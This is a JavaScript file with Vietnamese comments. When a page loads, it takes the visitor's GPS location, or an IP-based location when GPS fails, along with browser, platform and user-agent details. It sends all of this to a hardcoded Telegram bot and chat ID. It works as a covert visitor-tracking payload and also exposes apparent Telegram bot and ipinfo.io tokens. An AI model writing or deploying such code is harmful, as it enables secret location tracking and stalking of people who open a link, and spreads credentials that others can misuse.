const TELEGRAM_BOT_TOKEN = "8150545362:AAEKUQF0tJ7qkpMajhpV48baUbZ5IHnF-HA"; // ⚠️ NÊN ĐỔI TOKEN MỚI
const TELEGRAM_CHAT_ID = "6339940126"; // ID Telegram nhận tin nhắn
const IPINFO_TOKEN = "ffafdfeb7f37bf"; // Thay bằng token từ ipinfo.io

// Hàm lấy thông tin thiết bị
function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    let browser = "Không xác định";

    if (userAgent.includes("Chrome")) browser = "Google Chrome";
    if (userAgent.includes("Firefox")) browser = "Mozilla Firefox";
    if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) browser = "Safari";
    if (userAgent.includes("Edg")) browser = "Microsoft Edge";
    if (userAgent.includes("OPR") || userAgent.includes("Opera")) browser = "Opera";

    return {
        userAgent: userAgent,
        browser: browser,
        platform: navigator.platform
    };
}

// Hàm gửi thông tin lên Telegram
function sendToTelegram(lat, lon, accuracy, source, city, region, country) {
    const deviceInfo = getDeviceInfo();
    const locationUrl = lat && lon ? `https://www.google.com/maps?q=${lat},${lon}` : "Không xác định";

    const message = `
🔍 **THÔNG TIN TRUY CẬP**
🌍 Vị trí: [Xem trên bản đồ](${locationUrl})
🎯 Độ chính xác: ${accuracy}
📡 Nguồn dữ liệu: ${source}
🏙️ Thành phố: ${city || "Không xác định"}
🏛️ Tỉnh/Bang: ${region || "Không xác định"}
🌏 Quốc gia: ${country || "Không xác định"}
💻 Hệ điều hành: ${deviceInfo.platform}
🌐 Trình duyệt: ${deviceInfo.browser}
🖥️ User-Agent: ${deviceInfo.userAgent}
    `;

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    fetch(telegramUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "Markdown"
        })
    });
}

// Hàm lấy vị trí qua GPS
function getLocationByGPS() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((position) => {
            const { latitude, longitude, accuracy } = position.coords;
            sendToTelegram(latitude, longitude, `${accuracy} mét`, "GPS", "Không xác định", "Không xác định", "Không xác định");
        }, (error) => {
            console.log("Không thể lấy vị trí bằng GPS:", error);
            getLocationByIP(); // Nếu thất bại, dùng IP để lấy vị trí
        });
    } else {
        console.log("Trình duyệt không hỗ trợ GPS.");
        getLocationByIP(); // Nếu không có GPS, dùng IP
    }
}

// Hàm lấy vị trí qua IP
function getLocationByIP() {
    fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`)
        .then(response => response.json())
        .then(data => {
            const [lat, lon] = (data.loc || ",").split(",");
            sendToTelegram(lat, lon, "Dữ liệu từ IP (kém chính xác)", "IP", data.city, data.region, data.country);
        })
        .catch(error => {
            console.log("Không thể lấy vị trí từ IP:", error);
        });
}

// Gọi hàm lấy vị trí khi tải trang
getLocationByGPS();
